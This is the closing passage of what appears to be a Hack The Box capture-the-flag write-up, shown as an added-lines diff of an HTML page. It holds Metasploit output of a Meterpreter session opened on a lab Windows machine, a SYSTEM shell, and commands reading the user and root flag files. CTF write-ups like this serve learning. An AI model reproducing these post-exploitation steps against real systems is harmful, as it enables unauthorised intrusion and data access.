+ [*] Sending stage (201283 bytes) to 10.10.10.82
+ [*] Meterpreter session 1 opened (10.10.14.27:4445 -> 10.10.10.82:49167) at 2020-06-01 18:34:11 -0400
+ 
+ 
+ meterpreter > <br></figure></pre>
+<h2 id="Capture-The-Flag"><a href="#Capture-The-Flag" class="Capture-The-Flag" title="Capture-The-Flag"></a>Capture The Flag</h2>
+
+<pre><figure class="highlight plain"> meterpreter > shell
+ Process 2156 created.
+ Channel 1 created.
+ Microsoft Windows [Version 6.3.9600]
+ (c) 2013 Microsoft Corporation. All rights reserved.
+ 
+ C:\oraclexe\app\oracle\product\11.2.0\server\DATABASE>whoami
+ nt authority\system
+ C:\oraclexe\app\oracle\product\11.2.0\server\DATABASE>cd ..
+ C:\oraclexe\app\oracle\product\11.2.0\server>cd c:\Users
+ c:\Users>dir
+ dir
+  Volume in drive C has no label.
+  Volume Serial Number is 78D4-EA4D
+ 
+  Directory of c:\Users
+ 
+ 01/04/2018  10:40 PM    DIR          .
+ 01/04/2018  10:40 PM    DIR          ..
+ 01/03/2018  02:03 AM    DIR          .NET v2.0
+ 01/03/2018  02:03 AM    DIR          .NET v2.0 Classic
+ 01/03/2018  10:23 PM    DIR          .NET v4.5
+ 01/03/2018  10:23 PM    DIR          .NET v4.5 Classic
+ 01/01/2018  01:49 AM    DIR          Administrator
+ 01/03/2018  02:03 AM    DIR          Classic .NET AppPool
+ 01/07/2018  03:04 PM    DIR          Phineas
+ 08/22/2013  04:39 PM    DIR          Public
+                0 File(s)              0 bytes
+               10 Dir(s)  15,054,807,040 bytes free
+ cd Ph
+ c:\Users>ineas
+ cd Phineas
+ c:\Users\Phineas>cd Desktop
+ c:\Users\Phineas\Desktop>type user.txt
+ ***Here you could be find the user flag***
+ c:\Users\Phineas\Desktop>cd c:\Users\Administrator\Desktop
+  c:\Users\Administrator\Desktop>type root.txt
+ type root.txt
+ ***Here you could be find the root flag***
+ c:\Users\Administrator\Desktop></figure></pre>
+
+ 
+<p> And we owned root !</p>
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure class="avatar avatar-lg">
+          <img src="/avatar.png" alt="...">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>DiegoExploit</div>
+      <div>2020-05-31</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>
+
+      <a class="tag-link" href="/tags/linux/" rel="tag">#windows</a> <a class="tag-link" href="/tags/sqli/" rel="tag">#Exploit</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#Eternalsilo</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
